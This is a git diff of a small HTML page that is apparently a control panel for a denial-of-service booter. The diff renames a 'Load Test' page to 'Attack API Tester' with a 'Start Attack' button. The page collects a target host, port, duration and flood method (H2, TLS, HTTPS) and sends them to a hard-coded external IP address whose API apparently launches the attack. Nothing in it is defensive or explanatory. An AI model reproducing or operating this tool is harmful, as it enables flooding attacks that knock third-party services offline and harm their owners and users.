@@ -1,53 +1,42 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Load Test API</title>
+    <title>Attack API Interface</title>
 </head>
 <body>
-    <h2>Test Server Load</h2>
-    <label>Host:</label>
-    <input type="text" id="host" placeholder="http://example.com">
-    <br>
-    <label>Port:</label>
-    <input type="number" id="port" placeholder="80">
-    <br>
-    <label>Time (seconds):</label>
-    <input type="number" id="time" placeholder="60">
-    <br>
-    <label>Method:</label>
+    <h2>Attack API Tester</h2>
+    <label for="host">Host:</label>
+    <input type="text" id="host" placeholder="example.com"><br>
+    <label for="port">Port:</label>
+    <input type="number" id="port" placeholder="80"><br>
+    <label for="time">Time (s):</label>
+    <input type="number" id="time" placeholder="60"><br>
+    <label for="methods">Method:</label>
     <select id="methods">
         <option value="H2">H2</option>
         <option value="TLS">TLS</option>
-        <option value="BYPASS">BYPASS</option>
         <option value="HTTPS">HTTPS</option>
-    </select>
-    <br>
-    <button onclick="startTest()">Start Test</button>
-    <p id="result"></p>
-    
-    <script>
-        function startTest() {
-            const host = document.getElementById('host').value;
-            const port = document.getElementById('port').value;
-            const time = document.getElementById('time').value;
-            const methods = document.getElementById('methods').value;
-            
-            if (!host || !port || !time || !methods) {
-                document.getElementById('result').innerText = "Please fill all fields!";
-                return;
-            }
-            
-            fetch(`http://170.64.212.98:2047/api?host=${host}&port=${port}&time=${time}&methods=${methods}`)
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById('result').innerText = JSON.stringify(data, null, 2);
-                })
-                .catch(error => {
-                    document.getElementById('result').innerText = "Error: " + error;
-                });
+    </select><br>
+    <button onclick="sendAttack()">Start Attack</button>
+    <p id="response"></p><script>
+    async function sendAttack() {
+        const host = document.getElementById('host').value;
+        const port = document.getElementById('port').value;
+        const time = document.getElementById('time').value;
+        const methods = document.getElementById('methods').value;
+        
+        const apiUrl = `http://170.64.212.98:2047/api?host=${host}&port=${port}&time=${time}&methods=${methods}`;
+        
+        try {
+            const response = await fetch(apiUrl, { method: 'GET' });
+            const data = await response.json();
+            document.getElementById('response').innerText = JSON.stringify(data, null, 2);
+        } catch (error) {
+            document.getElementById('response').innerText = 'Error: ' + error;
         }
-    </script>
+    }
+</script>
+
 </body>
 </html>
